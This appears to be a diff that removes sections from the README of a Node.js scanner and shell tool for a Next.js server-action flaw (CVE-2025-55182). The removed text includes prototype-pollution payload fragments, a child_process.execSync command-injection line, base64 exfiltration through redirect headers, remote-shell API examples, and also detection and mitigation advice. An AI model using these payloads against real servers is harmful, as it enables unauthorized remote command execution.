@@ -116,115 +116,6 @@ node server.js
    - Identifies current working directory
    - Information stored for shell session use
 
-### Exploit Mechanism
-
-The scanner exploits CVE-2025-55182 through:
-
-1. **Multipart Form Data Pollution**
-   ```javascript
-   Content-Disposition: form-data; name="0"
-   {"then":"$1:__proto__:then","status":"resolved_model",...}
-   ```
-
-2. **Prototype Chain Manipulation**
-   ```javascript
-   "_response":{"_prefix":"<PAYLOAD>","_formData":{"get":"$1:constructor:constructor"}}
-   ```
-
-3. **Command Injection**
-   ```javascript
-   var res=process.mainModule.require('child_process').execSync('...')
-   ```
-
-4. **Output Exfiltration**
-   - Base64 encodes command output
-   - Returns via redirect header
-   - Automatically decoded in scanner
-
----
-
-## 🎯 API Endpoints
-
-### Scanner API
-
-#### `POST /api/scan`
-Start a new vulnerability scan.
-
-**Request:**
-```json
-{
-  "targetUrl": "https://example.com/"
-}
-```
-
-**Response:**
-```json
-{
-  "scanId": "1706543210123"
-}
-```
-
-#### `GET /api/scan/{scanId}`
-Get scan results.
-
-**Response:**
-```json
-{
-  "id": "1706543210123",
-  "target": "https://example.com/",
-  "status": "completed",
-  "vulnerable": true,
-  "systemInfo": {
-    "user": "ubuntu",
-    "userId": "uid=1000(ubuntu) gid=1000(ubuntu)",
-    "system": "Linux webserver 5.4.0-88-generic",
-    "workingDir": "/home/ubuntu"
-  },
-  "hasSudo": true,
-  "steps": [...]
-}
-```
-
-### Shell API
-
-#### `POST /api/session/create`
-Create a new shell session.
-
-**Request:**
-```json
-{
-  "targetUrl": "https://example.com/"
-}
-```
-
-**Response:**
-```json
-{
-  "sessionId": "1706543210456"
-}
-```
-
-#### `POST /api/session/execute`
-Execute a command in a session.
-
-**Request:**
-```json
-{
-  "sessionId": "1706543210456",
-  "command": "ls -la"
-}
-```
-
-**Response:**
-```json
-{
-  "success": true,
-  "output": "total 48\ndrwxr-xr-x 4 ubuntu ubuntu 4096 Jan 29 10:30 .\n...",
-  "currentDir": "/home/ubuntu",
-  "rootMode": false
-}
-```
-
 ---
 
 ## 🎮 Shell Commands
@@ -326,22 +217,6 @@ HOST=0.0.0.0 PORT=3000 node server.js
 - Share vulnerabilities publicly before patch
 - Use for malicious purposes
 
-### For Defenders
-
-**Detection Signatures:**
-- Monitor for multipart form-data with prototype pollution patterns
-- Look for base64-encoded payloads in HTTP headers
-- Alert on `child_process.execSync` in server logs
-- Track unusual Next-Action header combinations
-
-**Mitigation Steps:**
-1. Update Next.js to patched version
-2. Implement strict input validation
-3. Use Object.freeze() on critical prototypes
-4. Enable CSP headers
-5. Implement rate limiting
-6. Monitor for suspicious server action calls
-
 ---
 
 ## 📊 Project Structure
@@ -367,15 +242,6 @@ The vulnerability exists in Next.js server actions due to improper handling of m
 2. **Constructor Access** - Bypassing security restrictions
 3. **Code Injection** - Executing arbitrary JavaScript
 4. **Command Execution** - Running system commands via child_process
-
-### Attack Vector
-
-```
-Client → Malicious Multipart Payload → Next.js Server Action
-     → Prototype Pollution → Constructor Access
-     → child_process.execSync → Command Execution
-     → Base64 Output → Redirect Header → Client
-```
 
 ---
 
@@ -439,21 +305,6 @@ Client → Malicious Multipart Payload → Next.js Server Action
 
 ---
 
-## 🤝 Contributing
-
-Contributions are welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch
-3. Commit your changes
-4. Submit a pull request
-
-### Code Style
-- Use ES6+ features
-- Follow existing code structure
-- Add comments for complex logic
-- Test thoroughly before submitting
-
 ---
 
 ## 📄 License
@@ -472,11 +323,6 @@ This tool is intended for:
 - Red team operations with explicit permission
 - Educational demonstrations in controlled environments
 
-**Unauthorized access to computer systems is illegal under:**
-- Computer Fraud and Abuse Act (CFAA) - United States
-- Computer Misuse Act - United Kingdom
-- Similar legislation worldwide
-
 The authors and contributors are not responsible for any misuse or damage caused by this tool. Users must obtain written authorization before testing any systems they do not own.
 
 **By using this tool, you agree to:**
@@ -484,24 +330,3 @@ The authors and contributors are not responsible for any misuse or damage caused
 - Comply with all applicable laws and regulations
 - Use the tool ethically and responsibly
 - Accept full responsibility for your actions
-
----
-
-## 🙏 Acknowledgments
-
-- Original Python implementation authors
-- Security researchers working on Next.js vulnerabilities
-- Node.js core team for excellent built-in modules
-- The open-source security community
-
----
-
-## 📞 Contact
-
-For security issues, please use responsible disclosure channels.
-
----
-
-**Stay Legal. Stay Ethical. Stay Secure.** 🛡️
-
-Made with ❤️ by Security Researchers
